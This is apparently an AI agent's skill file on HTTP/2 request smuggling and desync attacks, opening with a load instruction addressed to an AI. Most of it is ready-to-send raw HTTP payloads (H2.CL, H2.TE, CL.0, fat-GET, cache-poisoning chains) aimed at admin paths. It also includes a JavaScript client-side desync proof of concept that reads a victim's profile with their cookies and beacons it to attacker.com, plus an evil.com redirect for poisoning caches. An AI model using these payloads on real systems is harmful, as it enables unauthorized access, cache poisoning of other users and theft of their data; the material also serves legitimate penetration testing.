# HTTP/2 Smuggling Variants & Advanced Desync Techniques

> **AI LOAD INSTRUCTION**: Load this when you need H2.CL/H2.TE byte-level payloads, CL.0 desync, Fat GET smuggling, smuggling→cache poisoning chains, client-side desync (CSD) flows, or CDN/reverse-proxy behavior matrices. Assumes the main [SKILL.md](./SKILL.md) is already loaded for CL.TE, TE.CL, TE.TE fundamentals.

---

## 1. H2.CL — HTTP/2 Content-Length Desync

Front-end speaks HTTP/2, downgrades to HTTP/1.1 toward back-end. H2 frame has its own length, but proxy also forwards `content-length` header. If these disagree, back-end trusts `content-length`.

### Attack Flow

```
1. Client sends H2 POST:
   - H2 DATA frame body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length: 0

2. Front-end (H2): reads entire DATA frame as body
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes = "GET /admin HTTP/1.1..." parsed as second request
```

### Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

### Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET /
Step 3: If back-end sees "GGET / HTTP/1.1" -> 405 or error -> confirmed
```

---

## 2. H2.TE — HTTP/2 Transfer-Encoding Desync

HTTP/2 spec forbids `transfer-encoding`, but some proxies don't strip it when downgrading to H1. Back-end sees `transfer-encoding: chunked` and uses chunked parsing.

### Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

### Variations

```http
transfer-encoding: chunked
Transfer-Encoding: chunked
transfer-encoding: identity
transfer-encoding:  chunked
```

---

## 3. CL.0 — CONNECTION CLOSE DESYNC

Back-end ignores `content-length` entirely and reads body length as 0. Remaining body bytes stay in socket buffer for next request. Does NOT require `transfer-encoding`.

### Vulnerable Conditions

- Redirects (301/302) that respond before reading full body
- Static file servers that ignore POST body
- Health-check endpoints

### Attack Flow

```
1. POST /redirect-page HTTP/1.1
   Content-Length: 30

   GET /admin HTTP/1.1
   X: x

2. Back-end sends 301 immediately without consuming body
3. "GET /admin HTTP/1.1\r\nX: x" remains in socket buffer
4. Next request on this connection prepended with smuggled bytes
```

### vs CL.TE

| Aspect | CL.TE | CL.0 |
|---|---|---|
| Requires TE header | Yes | No |
| Front/back disagreement | CL vs TE | CL vs "ignore body" |
| Common targets | Proxies parsing TE | Static servers, redirect endpoints |

---

## 4. FAT GET REQUEST SMUGGLING

Some proxies allow GET requests with a body. Front-end forwards body; back-end ignores it → desync.

### Payload

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

### Behavior Matrix

| Proxy/Server | GET Body |
|---|---|
| HAProxy | Forwards |
| Nginx (proxy) | Forwards |
| Apache | Forwards |
| Cloudflare | Strips |
| AWS ALB | May strip |
| Express.js (back-end) | Ignores |
| PHP-FPM | Ignores |

When front-end forwards and back-end ignores → desync.

---

## 5. REQUEST SMUGGLING → CACHE POISONING CHAIN

```
1. Attacker smuggles a request that returns malicious content
2. Smuggled response is associated with a cacheable URL by front-end
3. Cache stores malicious response under legitimate URL
4. All subsequent users get poisoned content
```

### CL.TE → Cache Poisoning

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

1. Back-end (TE): POST ends at `0\r\n\r\n`, then `GET /static/app.js` is new request
2. Back-end response matched to **next legitimate request** on same connection
3. If next request is for `/static/app.js` → cache poisoned

### Targeted Poisoning via Redirect

```http
GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
```

If `/redirect` returns 302 to `evil.com`, and cache stores for next request's URL → all users redirected to evil.com for that URL.

---

## 6. CLIENT-SIDE DESYNC (CSD)

Exploits browser `fetch()` to cause desync between browser and web server. Unlike server-side smuggling (poisons shared connection pool), CSD poisons the **browser's own connection**.

### Prerequisites

1. Server reuses connections (not `Connection: close` every response)
2. Attacker can inject JS on target or same-site page
3. Server endpoint that doesn't consume full request body (CL.0-style)

### Flow

```
1. Attacker JS sends fetch() with smuggled GET in body (CL.0 endpoint)
2. Server responds immediately (ignoring body)
3. Smuggled GET remains in TCP buffer
4. Follow-up fetch() on same connection processes smuggled bytes
5. Browser gets wrong response → exfiltrate
```

### JavaScript PoC

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: smuggledRequest
    });

    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### Limitations

- Browser may use different connections → desync fails
- `Connection: close` prevents reuse
- Same-site cookie policies limit credential inclusion
- Hard to reliably predict connection reuse

### Pause-Based CSD

```
1. Server has timeout: if body not fully received in N seconds, responds and moves on
2. Send large Content-Length (1000) but only 50 bytes + smuggled request
3. Server times out, responds to partial request
4. Remaining bytes (smuggled) stay in buffer
```

---

## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE present (configurable) |
| **Nginx** | Rejects (400) | N/A | Strict |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable |
| **Envoy** | Rejects (400) | N/A | Very strict |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### HTTP/2 Downgrade Behavior

| Product | TE Header Handling | CL Passthrough |
|---|---|---|
| HAProxy | May pass TE | Passes CL |
| Nginx | Strips TE | Passes CL |
| Cloudflare | Strips TE | Normalizes CL |
| AWS ALB | Strips TE | Passes CL |
| Envoy | Strips TE | Strict validation |

### GET Body Handling

| Product | Forwards GET Body |
|---|---|
| HAProxy | Yes |
| Nginx | Yes |
| Cloudflare | Strips |
| AWS ALB | Depends |
| Varnish | Strips |

---

## 8. TESTING METHODOLOGY

### Safe Probe Sequence

```
1. Identify architecture: check Via, Server, X-Served-By, CDN headers
2. HTTP version: curl --http2 https://target.com -v (check ALPN h2)
3. Time-based CL.TE probe:
   POST / HTTP/1.1
   Content-Length: 4
   Transfer-Encoding: chunked

   1
   A
   0

   If response delayed -> back-end waiting for chunked end -> CL.TE likely
4. H2 desync: content-length: 0 + body with smuggled prefix
5. CL.0: find redirect/static endpoints, send POST with excess body
```

### Tools

| Tool | Purpose |
|---|---|
| Burp Suite HTTP Request Smuggler | Automated variant scanning |
| h2csmuggler | HTTP/2 cleartext smuggling |
| smuggler.py (defparam) | CL.TE, TE.CL, TE.TE automation |
| http2smugl | H2-specific desync testing |
| hyper (Python) | Low-level H2 frame crafting |

### Impact Escalation Checklist

```
□ Confirmed desync variant (CL.TE / TE.CL / H2.CL / H2.TE / CL.0)
□ Can smuggle full request?
□ Connection pooling enabled? (affects other users -> critical)
□ Cacheable endpoints exist? (-> cache poisoning)
□ Authenticated endpoints reachable? (-> auth bypass, data theft)
□ Can reflect content in response? (-> stored XSS via cache)
□ Admin/internal paths accessible? (-> privilege escalation)
□ Client-side desync possible? (-> per-user attacks)
```
